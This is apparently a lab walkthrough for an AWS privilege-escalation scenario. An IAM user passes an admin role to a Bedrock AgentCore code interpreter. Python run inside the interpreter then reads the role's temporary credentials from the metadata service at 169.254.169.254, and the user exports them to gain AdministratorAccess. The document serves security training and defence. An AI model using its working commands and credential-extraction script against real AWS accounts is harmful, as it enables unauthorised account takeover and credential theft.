# Guided Walkthrough: Privilege Escalation via iam:PassRole + Bedrock AgentCore Code Interpreter

This scenario demonstrates a novel privilege escalation vulnerability discovered by Nigel Sood at Sonrai Security in 2025. An attacker with `iam:PassRole` and Bedrock AgentCore permissions can create a code interpreter with a privileged IAM role. Code interpreters run on Firecracker MicroVMs that expose a MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to EC2's Instance Metadata Service (IMDS). By invoking Python code within the interpreter session, the attacker can access the metadata service to extract temporary credentials for the execution role, gaining its full permissions.

This represents a significant expansion of the traditional PassRole attack surface into AWS's AI/ML tooling ecosystem. Unlike EC2 or Lambda functions which require infrastructure deployment, code interpreters provide immediate interactive access to credentials through their metadata service.

The vulnerability is particularly dangerous because code interpreters provide immediate, interactive credential access with no waiting for service initialization, the attack can be executed entirely through API calls without deploying persistent infrastructure, many organizations are adopting Bedrock for AI/ML workloads without awareness of this escalation path, and traditional CSPM tools may not detect this as a privilege escalation risk.

## The Challenge

You start as `pl-prod-bedrock-001-to-admin-starting-user`, an IAM user with a narrow set of permissions: `iam:PassRole` on the target admin role, and the Bedrock AgentCore permissions needed to create and invoke a code interpreter. You cannot list IAM users, assume roles directly, or take any other privileged action in the account.

Your goal is to obtain credentials for `pl-prod-bedrock-001-to-admin-target-role`, an IAM role with `AdministratorAccess`. The credentials for the starting user are provided via Terraform outputs.

## Reconnaissance

First, let's confirm who you are and what you're working with:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-bedrock-001-to-admin-starting-user
```

Try listing IAM users to confirm you don't already have admin access:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

If you have `iam:ListRoles`, you can enumerate available roles to identify the privileged target:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `bedrock-001`)].{Name:RoleName,Arn:Arn}' --output table
```

You'll find `pl-prod-bedrock-001-to-admin-target-role`. If you have `iam:GetRole`, you can inspect its trust policy and confirm it trusts `bedrock-agentcore.amazonaws.com`:

```bash
aws iam get-role --role-name pl-prod-bedrock-001-to-admin-target-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy will show `bedrock-agentcore.amazonaws.com` as a trusted service principal. This means you can pass this role to a Bedrock code interpreter. Now let's use that.

## Exploitation

The core idea: Bedrock AgentCore code interpreters run Python in a Firecracker MicroVM. The MicroVM exposes a metadata service at 169.254.169.254 that vends temporary credentials for the interpreter's execution role — just like EC2's IMDS does for instance profiles. If you create a code interpreter with a privileged execution role and then run Python code inside it, you can reach out to that metadata service and steal credentials for the privileged role.

### Step 1: Create the Code Interpreter with the Admin Role

Retrieve your account ID first, then create the code interpreter, passing the target admin role as its execution role:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-001-to-admin-target-role"

INTERPRETER_ID=$(aws bedrock-agentcore-control create-code-interpreter \
  --region us-east-1 \
  --name privesc_demo_interpreter \
  --network-configuration '{"networkMode":"SANDBOX"}' \
  --execution-role-arn "$TARGET_ROLE_ARN" \
  --query 'codeInterpreterId' \
  --output text)

echo "Code Interpreter ID: $INTERPRETER_ID"
```

The `iam:PassRole` permission you hold allows the API call to succeed. Bedrock AgentCore now provisions a Firecracker MicroVM with the admin role as its execution role. Wait about 15 seconds for initialization.

### Step 2: Start a Session and Extract Credentials from the MMDS

Now you need to start a code interpreter session and invoke Python code inside it to query the metadata service. The MMDS endpoint follows the same path structure as EC2 IMDS, including support for IMDSv2 token-based access.

The easiest approach is to use boto3 from your local machine to orchestrate this. Create a Python helper script at `/tmp/extract_bedrock_creds.py`:

```python
import boto3, sys, json

CODE_INTERPRETER_ID = sys.argv[1]
AWS_REGION = sys.argv[2]

client = boto3.client('bedrock-agentcore', region_name=AWS_REGION)

session = client.start_code_interpreter_session(
    codeInterpreterIdentifier=CODE_INTERPRETER_ID,
)
session_id = session['sessionId']

# Python code that will run inside the MicroVM
code = '''import urllib.request, json
IP = "169.254.169.254"
token_req = urllib.request.Request(
    f"http://{IP}/latest/api/token", method="PUT",
    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
)
token = urllib.request.urlopen(token_req).read().decode()
role_req = urllib.request.Request(
    f"http://{IP}/latest/meta-data/iam/security-credentials/",
    headers={"X-aws-ec2-metadata-token": token}
)
role_name = urllib.request.urlopen(role_req).read().decode().strip()
creds_req = urllib.request.Request(
    f"http://{IP}/latest/meta-data/iam/security-credentials/{role_name}",
    headers={"X-aws-ec2-metadata-token": token}
)
print(urllib.request.urlopen(creds_req).read().decode())
'''

response = client.invoke_code_interpreter(
    codeInterpreterIdentifier=CODE_INTERPRETER_ID,
    sessionId=session_id,
    name='executeCode',
    arguments={'code': code, 'language': 'python'}
)

for event in response['stream']:
    if 'result' in event:
        stdout = event['result'].get('structuredContent', {}).get('stdout', '')
        if stdout:
            print(stdout)
```

Run it with your starting user credentials active:

```bash
python3 /tmp/extract_bedrock_creds.py "$INTERPRETER_ID" us-east-1
```

The script starts a session inside the code interpreter MicroVM, runs the Python credential-extraction code, and prints the JSON credentials for `pl-prod-bedrock-001-to-admin-target-role`. You'll see a response like:

```json
{
  "Code": "Success",
  "LastUpdated": "...",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

### Step 3: Use the Extracted Credentials

Export those credentials to your shell:

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId from above>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey from above>"
export AWS_SESSION_TOKEN="<Token from above>"
```

## Verification

Confirm you are now operating as the admin role:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-bedrock-001-to-admin-target-role/...
```

Verify administrator access by performing an action your original user couldn't:

```bash
aws iam list-users --max-items 3 --output table
# Returns a table of IAM users — you now have full admin access
```

## What Happened

You started as an IAM user with no meaningful AWS access beyond a narrow set of Bedrock and PassRole permissions. By passing the admin role to a Bedrock AgentCore code interpreter, you caused AWS to provision a Firecracker MicroVM that holds temporary credentials for that role. Those credentials are vended via the MicroVM Metadata Service at 169.254.169.254 — a service accessible from any code running inside the interpreter. With a few lines of Python, you reached into the MicroVM, grabbed the credentials, and stepped out with full `AdministratorAccess`.

This is the PassRole attack surface expanding into AI/ML services. Any AWS service that (a) accepts an execution role via PassRole and (b) makes those credentials accessible from within a compute environment is a potential privilege escalation vector. Bedrock AgentCore code interpreters are particularly effective because the path from "create interpreter" to "extract credentials" is entirely API-driven and leaves no persistent infrastructure beyond a short-lived session.
